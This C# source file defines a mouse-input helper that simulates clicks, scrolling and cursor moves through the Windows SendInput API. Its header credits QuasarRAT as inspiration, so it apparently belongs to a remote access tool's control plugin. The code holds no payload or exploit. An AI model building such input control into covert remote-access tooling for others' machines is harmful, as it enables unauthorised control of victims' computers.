using System.Drawing;
using System.Runtime.InteropServices;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : QuasarRAT  ||
*/

namespace Plugin
{
    internal class MouseHelper
    {
        internal static void MouseLeftClick(Point p, bool isMouseDown)
        {
            Imports.INPUT[] inputs = {
                new Imports.INPUT
                {
                    type = Imports.INPUT_MOUSE,
                    u = new Imports.InputUnion
                    {
                        mi = new Imports.MOUSEINPUT
                        {
                            dx = p.X,
                            dy = p.Y,
                            mouseData = 0,
                            dwFlags = isMouseDown ? Imports.MOUSEEVENTF_LEFTDOWN : Imports.MOUSEEVENTF_LEFTUP,
                            time = 0,
                            dwExtraInfo = Imports.GetMessageExtraInfo()
                        }
                    }
                }
            };

            Imports.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Imports.INPUT)));
        }

        internal static void MiddleMouseClick(Point p, bool isMouseDown) 
        {
            Imports.INPUT[] inputs = {
                new Imports.INPUT
                {
                    type = Imports.INPUT_MOUSE,
                    u = new Imports.InputUnion
                    {
                        mi = new Imports.MOUSEINPUT
                        {
                            dx = p.X,
                            dy = p.Y,
                            mouseData = 0,
                            dwFlags = isMouseDown ? Imports.MOUSEEVENTF_MIDDLEDOWN : Imports.MOUSEEVENTF_MIDDLEUP,
                            time = 0,
                            dwExtraInfo = Imports.GetMessageExtraInfo()
                        }
                    }
                }
            };

            Imports.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Imports.INPUT)));
        }

        internal static void MouseRightClick(Point p, bool isMouseDown)
        {
            Imports.INPUT[] inputs = {
                new Imports.INPUT
                {
                    type =  Imports.INPUT_MOUSE,
                    u = new Imports.InputUnion
                    {
                        mi = new Imports.MOUSEINPUT
                        {
                            dx = p.X,
                            dy = p.Y,
                            mouseData = 0,
                            dwFlags = isMouseDown ?  Imports.MOUSEEVENTF_RIGHTDOWN :  Imports.MOUSEEVENTF_RIGHTUP,
                            time = 0,
                            dwExtraInfo = Imports.GetMessageExtraInfo()
                        }
                    }
                }
            };

            Imports.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Imports.INPUT)));
        }


        internal static void MouseScroll(Point p, bool scrollDown)
        {
            Imports.INPUT[] inputs = {
                new Imports.INPUT
                {
                    type = Imports.INPUT_MOUSE,
                    u = new Imports.InputUnion
                    {
                        mi = new Imports.MOUSEINPUT
                        {
                            dx = p.X,
                            dy = p.Y,
                            mouseData = scrollDown ? -120 : 120,
                            dwFlags = Imports.MOUSEEVENTF_WHEEL,
                            time = 0,
                            dwExtraInfo = Imports.GetMessageExtraInfo()
                        }
                    }
                }
            };

            Imports.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Imports.INPUT)));
        }

        internal static void MouseMove(Point p)
        {
            Imports.SetCursorPos(p.X, p.Y);
        }
    }
}
